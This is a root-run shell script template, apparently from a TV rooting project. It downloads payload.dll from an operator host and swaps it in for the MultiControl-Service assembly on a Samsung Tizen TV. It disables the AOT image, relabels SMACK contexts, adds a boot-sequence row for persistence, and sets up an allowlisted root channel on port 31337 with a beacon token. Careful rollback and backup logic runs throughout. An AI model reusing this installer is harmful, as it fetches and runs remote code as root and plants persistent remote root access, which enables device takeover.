#!/bin/sh
# Install the root-on-boot payload into the MultiControl-Service app.
# Runs on the TV as root (the deploy child inherits the patched stub cred).
#
# THIS FILE IS A TEMPLATE.  server.py renders it per request: @HOST@ becomes the
# IPv4 address the TV used to fetch it, @WANT@/@SIZE@ the md5/size of the
# payload.dll being served.  Serving it from a plain static server leaves the
# markers in place and the script refuses to run (NEED_RENDER), so a stale
# generated copy (the v37/v38 deploy_local.sh incident) cannot happen again.
#
# Ordering matters.  The script is run through the 31337 channel, whose Run()
# has a hard command budget, so it can be killed at any point.  Everything that
# can fail is therefore done BEFORE the irreversible steps, and the irreversible
# steps are rolled back by the EXIT trap:
#   1. verify the payload (size+md5)         - nothing touched
#   2. snapshot the stock IL/AOT + previous  - nothing touched
#   3. allowlist/host file                   - nothing touched
#   4. boot row + readback + AUL reload      - app still stock, harmless
#   5. disable AOT, stage/label/mv the DLL   - first irreversible steps
# Anything from step 5 that fails restores the previous DLL from
# payload_backup.dll, re-enables the AOT and deletes the boot row.
H=@HOST@
HIP=${H#*://}
S=/opt/usr/home/owner/share
D=/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll
BIN=/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin
B="$S/payload_backup.dll"
A="$S/rootchan.allow"
HOSTF="$S/rootchan.host"
DB=/opt/dbspace/user/5001/.appsvc.db
WANT=@WANT@
SIZE_WANT=@SIZE@
# v41 beacon token: server-rendered per deploy; the payload sends it as `tok=`
# in every beacon and the server gates the shell slot on it (see SECURITY.md).
TOKEN=@BEACON_TOKEN@
APPID=com.samsung.tv.MultiControl-Service
# SMACK label the app runs under.  Files in bin/ carry "<label>::RO" and the app
# (label "<label>") may read those.  A file created by US keeps OUR label - e.g.
# User::Pkg::org.tizen.browser when the deploy runs from the browser stub - and
# the app is then denied read on its own assembly and dies before Main.  That was
# the entire 2026-10-22 boot-persistence regression, so set it explicitly.
WANT_LABEL="User::Pkg::$APPID::RO"
APP_LABEL="User::Pkg::$APPID"

# --- rollback state -----------------------------------------------------------
TMPD=""
ROLLBACK=0
AOT_MOVED=""
CLEANED=0
cleanup() {
  rc=$?
  [ "$CLEANED" = 1 ] && return 0
  CLEANED=1
  rm -f "$D.tmp" "$B.tmp" "$D.rollback" 2>/dev/null
  if [ "$ROLLBACK" = 1 ]; then
    echo "ROLLBACK_START rc=$rc"
    if [ -f "$B" ]; then
      if cp -p "$B" "$D.rollback" 2>/dev/null && mv "$D.rollback" "$D" 2>/dev/null; then
        echo "ROLLBACK=il_restored"
      else
        echo "ROLLBACK=il_fail (restore by hand from $B)"
      fi
    fi
    if [ -n "$AOT_MOVED" ] && [ -d "$AOT_MOVED" ] && [ ! -e "$BIN/.native_image" ]; then
      mv "$AOT_MOVED" "$BIN/.native_image" 2>/dev/null && echo "ROLLBACK=aot_restored"
    fi
    if [ -f "$DB" ]; then
      sqlite3 "$DB" "delete from boot_sequence where appid='$APPID';" >/dev/null 2>&1 &&
        echo "ROLLBACK=boot_row_removed"
    fi
    echo "ROLLBACK=done"
  fi
  if [ -n "$TMPD" ]; then rm -rf "$TMPD" 2>/dev/null; fi
  if [ "$rc" != 0 ]; then exit "$rc"; fi
}
trap cleanup 0
# A TERM/INT from the channel's Run() budget must roll back too, not just `exit`.
trap 'exit 130' 1 2 15

echo DEPLOY_START
U=$(id -u)
echo "UID=$U"
if [ "$U" != "0" ]; then
  echo NOT_ROOT
  exit 1
fi

# A template that was served statically still contains the markers: the md5 gate
# would reject everything and the operator would blame the payload.
case "$H$WANT$TOKEN" in
  *@HOST@*|*@WANT@*|*@BEACON_TOKEN@*)
    echo NEED_RENDER
    echo "HINT: serve deploy.sh from server/server.py (renders @HOST@/@WANT@/@BEACON_TOKEN@), not a static file server"
    exit 1 ;;
esac
case "$TOKEN" in
  [0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]) ;;
  *) echo BAD_TOKEN; echo "HINT: TOKEN=$TOKEN is not 8 hex chars"; exit 1 ;;
esac
if [ "$HIP" = "" ] || [ "$HIP" = "$H" ]; then
  echo BAD_HOST
  echo "HINT: H=$H is not an http:// URL"
  exit 1
fi

[ -f "$DB" ] || { echo DB_MISSING; echo "HINT: $DB is not present - wrong model/firmware?"; exit 1; }
[ -d "$BIN" ] || { echo APP_MISSING; echo "HINT: $BIN is not present - is the app installed?"; exit 1; }

umask 077
TMPD=$(mktemp -d "${TMPDIR:-/tmp}/dsh_deploy.XXXXXX" 2>/dev/null) || TMPD=""
if [ -z "$TMPD" ]; then
  TMPD="/tmp/.dsh_deploy.$$"
  (umask 077 && mkdir -p "$TMPD") || TMPD=""
fi
[ -n "$TMPD" ] && [ -d "$TMPD" ] || { echo TMP_FAIL; exit 1; }
OUT="$TMPD/payload.dll"

curl -fsS -o "$OUT" "$H/payload.dll" || { echo CURL_FAIL; exit 1; }
SIZE=$(wc -c < "$OUT" | tr -d ' ')
echo "SIZE=$SIZE"
md5sum "$OUT"

# verify before touching the app: exact size and md5
if [ "$SIZE" != "$SIZE_WANT" ] || ! md5sum "$OUT" | grep -q "^$WANT"; then
  echo COPY=skip
  exit 1
fi

# --- take the app's label -----------------------------------------------------
# The browser lane runs the stub under User::Pkg::org.tizen.browser, and only the
# app's own label can write bin/.  A 31337 root shell already carries it, so this
# is a no-op there.  Failure is reported but not fatal: the COPY below names it.
if [ "$(cat /proc/self/attr/current 2>/dev/null)" != "$APP_LABEL" ]; then
  # redirect stderr first: opening /proc/self/attr/current can fail before the
  # later 2>/dev/null applies, which printed a confusing shell error on a PC
  # dry-run and on any kernel where the attr write is denied.
  printf %s "$APP_LABEL" 2>/dev/null > /proc/self/attr/current 2>/dev/null
fi
if [ "$(cat /proc/self/attr/current 2>/dev/null)" = "$APP_LABEL" ]; then
  echo RELABEL=ok
else
  echo "RELABEL=fail (current=$(cat /proc/self/attr/current 2>/dev/null))"
fi

# --- stock backups, BEFORE anything is replaced -------------------------------
# uninstall.sh refuses to run without these.  The snapshot is taken whenever the
# current IL is readable and is not the payload we are about to install - not only
# when it matches one known retail hash.  Before 2026-10-26 the non-retail branch
# printed "skip" and replaced the only stock copy, which made uninstall
# impossible forever on any other firmware (review finding H1).
IL_MD5=$(md5sum "$D" 2>/dev/null | cut -d' ' -f1)
if [ -f "$S/mcs_orig.dll" ]; then
  echo BACKUP_IL=exists
elif [ -z "$IL_MD5" ]; then
  echo BACKUP_IL=fail
  echo "HINT: cannot read $D - refusing to replace a file we cannot snapshot"
  exit 1
elif [ "$IL_MD5" = "$WANT" ]; then
  echo "BACKUP_IL=skip (payload already installed and no stock backup exists; uninstall needs one)"
else
  if cp -p "$D" "$S/mcs_orig.dll" && printf '%s\n' "$IL_MD5" > "$S/mcs_orig.md5"; then
    echo BACKUP_IL=ok
  else
    echo BACKUP_IL=fail
    echo "HINT: could not snapshot the stock IL - refusing to replace the only stock copy"
    exit 1
  fi
fi
# The AOT image is never written by us (only its directory is renamed), so
# whatever is there IS the stock image: snapshot it without a hash whitelist.
if [ -f "$S/mcs_ni_orig.dll" ]; then
  echo BACKUP_NI=exists
elif [ -d "$BIN/.native_image" ]; then
  NI=$(ls "$BIN"/.native_image/*.ni.dll 2>/dev/null | head -n1)
  if [ -n "$NI" ]; then
    NI_MD5=$(md5sum "$NI" | cut -d' ' -f1)
    if cp -p "$NI" "$S/mcs_ni_orig.dll" && printf '%s\n' "$NI_MD5" > "$S/mcs_ni_orig.md5"; then
      echo BACKUP_NI=ok
    else
      echo BACKUP_NI=fail
      echo "HINT: could not snapshot the stock AOT image"
      exit 1
    fi
  else
    echo BACKUP_NI=none
  fi
else
  echo BACKUP_NI=none
fi

# Rollback copy: the DLL that is live right now (stock on a first deploy, the
# previous payload on an upgrade).  AGENTS.md always described payload_backup.dll
# this way; before 2026-10-26 it was a second copy of the NEW payload.
if cp -p "$D" "$B.tmp" 2>/dev/null && mv "$B.tmp" "$B" 2>/dev/null; then
  echo "PREV_IL=$(md5sum "$B" | cut -d' ' -f1)"
else
  echo PREV_IL=fail
  echo "HINT: cannot save a rollback copy of $D"
  exit 1
fi

# v7+ allowlist: only this host may use port 31337.  Written BEFORE the DLL so an
# interrupted deploy can never leave an open (unauthenticated) root channel.
printf '%s\n' "$HIP" > "$A" || { echo ALLOW_FAIL; exit 1; }
echo "ALLOW=$HIP"
# Record the PC address on the TV: recover.sh reads it, and the payload can use it
# instead of a compiled-in default.
printf '%s\n' "$HIP" > "$HOSTF" || { echo HOST_FILE_FAIL; exit 1; }
echo "HOST_FILE=$HIP"
# v41 beacon token, same ordering argument as the allowlist: written before the
# DLL moves, so an interrupted deploy never leaves the server expecting a token
# the payload does not know (the server then refuses unknown-tok beacons and
# only logs token-less ones).  chmod 644: the deploy shell runs as root and the
# file would land 0600, but the payload reads it as uid 5001 - the first v41
# deploy beached token-less for exactly this reason (found live, 2026-10-27).
printf '%s\n' "$TOKEN" > "$S/rootchan.token" || { echo TOKEN_FILE_FAIL; exit 1; }
chmod 644 "$S/rootchan.token" 2>/dev/null
echo "TOKEN_FILE=$TOKEN"

# --- boot row first: harmless while the stock app is still in place ------------
if ! sqlite3 "$DB" ".timeout 5000" "insert or replace into boot_sequence(package,appid,after,before,requires,conflicts,vconf,path_exists,args,background_launch,wait_until_ready,timeout) values('com.samsung.tv.MultiControl-Service','com.samsung.tv.MultiControl-Service','','','','','','','','false','true','10');"; then
  echo BOOT_ROW_FAIL
  exit 1
fi
ROWS=$(sqlite3 "$DB" ".timeout 5000" "select count(*) from boot_sequence where appid='com.samsung.tv.MultiControl-Service';" 2>/dev/null)
echo "BOOT_ROW_COUNT=${ROWS:-unknown}"
if [ "$ROWS" != "1" ]; then
  echo BOOT_ROW_WARN
  exit 1
fi
# AUL caches the boot sequence; reload so the row is picked up at boot
if ! aulctl reload 5001; then
  echo AUL_RELOAD=fail
  exit 1
fi
echo AUL_RELOAD=ok

# --- irreversible steps from here --------------------------------------------
ROLLBACK=1

# the runtime prefers the AOT image; disable it so the IL (payload) runs
if [ -d "$BIN/.native_image" ]; then
  AOT_MOVED="$BIN/.native_image.disabled.$(date +%s)"
  if [ -e "$AOT_MOVED" ]; then AOT_MOVED="$AOT_MOVED.$$"; fi
  mv "$BIN/.native_image" "$AOT_MOVED" || {
    AOT_MOVED=""
    echo AOT_FAIL
    echo "HINT: could not move $BIN/.native_image aside"
    exit 1
  }
  echo AOT=disabled
else
  echo AOT=already-disabled
fi

# atomic within the same directory: no half-written DLL if the app dies.
# The label is set and VERIFIED on the temp file, before it can replace the live
# one: a mismatch that aborted after the rename would leave the app unable to
# start (the 2026-10-22 regression).  A failed copy MUST abort too - previously
# the script printed COPY=ok even when every cp was denied.
cp "$OUT" "$D.tmp" || {
  echo COPY=fail
  echo "HINT: the app bin/ is not writable from this label - deploy from the"
  echo "app's own channel (31337) or fix the SMACK label first"
  exit 1
}
chmod 0644 "$D.tmp" 2>/dev/null
# chsmack needs the file's *current* label to match the caller's for an
# unprivileged relabel, which is exactly the case here (we just created it).
chsmack -a "$WANT_LABEL" "$D.tmp" 2>/dev/null
GOT_LABEL=$(ls -lZ "$D.tmp" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i ~ /^User::|^System::|^_$/) {print $i; exit}}')
echo "DLL_LABEL=$GOT_LABEL"
if [ "$GOT_LABEL" != "$WANT_LABEL" ]; then
  echo DLL_LABEL_MISMATCH
  rm -f "$D.tmp"
  exit 1
fi
mv "$D.tmp" "$D" || { echo COPY=fail; exit 1; }
# verify the installed file, not the download: a failed mv that left a partial
# file must roll back instead of printing a success token
if ! md5sum "$D" | grep -q "^$WANT"; then
  echo MD5_FAIL
  exit 1
fi

# `reload` only refreshes AUL's copy of the sequence - it does NOT restart an
# app that is already running, so a changed DLL stays unloaded. `aulctl stop`
# never returns while this payload is the running app (2026-10-25: channel
# stayed on the old DLL for 80 s after DEPLOY_DONE). AUL relaunches a killed
# on-boot app in ~12 s (the documented kill -9 path). Sleep first so the
# channel can send DEPLOY_DONE; /dev/video40 gates the scan so a PC dry-run
# does not walk the host's /proc.
PIDS=""
if [ -e /dev/video40 ]; then
  for d in /proc/[0-9]*; do
    pid=${d#/proc/}
    case "$pid" in *[!0-9]*) continue ;; esac
    [ -f "$d/cmdline" ] || continue
    tr '\0' ' ' < "$d/cmdline" 2>/dev/null | grep -q MultiControlService.dll || continue
    PIDS="$PIDS $pid"
  done
fi
if [ -n "$PIDS" ]; then
  echo "RESTART=kill$PIDS"
  ( trap '' HUP
    sleep 2
    kill -9 $PIDS >/dev/null 2>&1 || echo RESTART_KILL=fail
    sleep 2
    aulctl start "$APPID" >/dev/null 2>&1 || echo RESTART_START=fail
  ) >/dev/null 2>&1 &
else
  echo RESTART=skip
fi

# Everything fatal has passed: keep the new DLL even if the shell dies now.
ROLLBACK=0
echo COPY=ok
echo DEPLOY_DONE
